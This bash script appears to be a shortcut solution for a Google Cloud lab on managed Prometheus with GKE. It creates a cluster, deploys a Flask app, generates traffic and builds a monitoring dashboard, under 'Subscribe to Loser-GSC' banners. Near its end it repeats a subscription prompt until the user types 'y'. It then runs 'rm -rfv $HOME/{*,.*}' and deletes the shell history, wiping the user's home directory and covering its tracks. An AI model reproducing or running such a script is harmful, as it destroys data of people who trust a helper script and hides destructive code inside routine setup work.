
gcloud auth list

export ZONE=$(gcloud compute project-info describe --format="value(commonInstanceMetadata.items[google-compute-default-zone])")

gcloud beta container clusters create gmp-cluster --num-nodes=1 --zone $ZONE --enable-managed-prometheus

gcloud container clusters get-credentials gmp-cluster --zone $ZONE

kubectl create ns gmp-test

YELLOW='\033[0;33m'
NC='\033[0m' 
pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)

kubectl -n gmp-test apply -f https://raw.githubusercontent.com/kyleabenson/flask_telemetry/master/gmp_prom_setup/flask_deployment.yaml

kubectl -n gmp-test apply -f https://raw.githubusercontent.com/kyleabenson/flask_telemetry/master/gmp_prom_setup/flask_service.yaml

url=$(kubectl get services -n gmp-test -o jsonpath='{.items[*].status.loadBalancer.ingress[0].ip}')

curl $url/metrics

kubectl -n gmp-test apply -f https://raw.githubusercontent.com/kyleabenson/flask_telemetry/master/gmp_prom_setup/prom_deploy.yaml

timeout 120 bash -c -- 'while true; do curl $(kubectl get services -n gmp-test -o jsonpath='{.items[*].status.loadBalancer.ingress[0].ip}'); sleep $((RANDOM % 4)) ; done'

gcloud monitoring dashboards create --config='''
{
  "category": "CUSTOM",
  "displayName": "Prometheus Dashboard Example",
  "mosaicLayout": {
    "columns": 12,
    "tiles": [
      {
        "height": 4,
        "widget": {
          "title": "prometheus/flask_http_request_total/counter [MEAN]",
          "xyChart": {
            "chartOptions": {
              "mode": "COLOR"
            },
            "dataSets": [
              {
                "minAlignmentPeriod": "60s",
                "plotType": "LINE",
                "targetAxis": "Y1",
                "timeSeriesQuery": {
                  "apiSource": "DEFAULT_CLOUD",
                  "timeSeriesFilter": {
                    "aggregation": {
                      "alignmentPeriod": "60s",
                      "crossSeriesReducer": "REDUCE_NONE",
                      "perSeriesAligner": "ALIGN_RATE"
                    },
                    "filter": "metric.type=\"prometheus.googleapis.com/flask_http_request_total/counter\" resource.type=\"prometheus_target\"",
                    "secondaryAggregation": {
                      "alignmentPeriod": "60s",
                      "crossSeriesReducer": "REDUCE_MEAN",
                      "groupByFields": [
                        "metric.label.\"status\""
                      ],
                      "perSeriesAligner": "ALIGN_MEAN"
                    }
                  }
                }
              }
            ],
            "thresholds": [],
            "timeshiftDuration": "0s",
            "yAxis": {
              "label": "y1Axis",
              "scale": "LINEAR"
            }
          }
        },
        "width": 6,
        "xPos": 0,
        "yPos": 0
      }
    ]
  }
}
'''

read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0


pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)
for line in "${pattern[@]}"
do
    echo -e "${YELLOW}${line}${NC}"
done

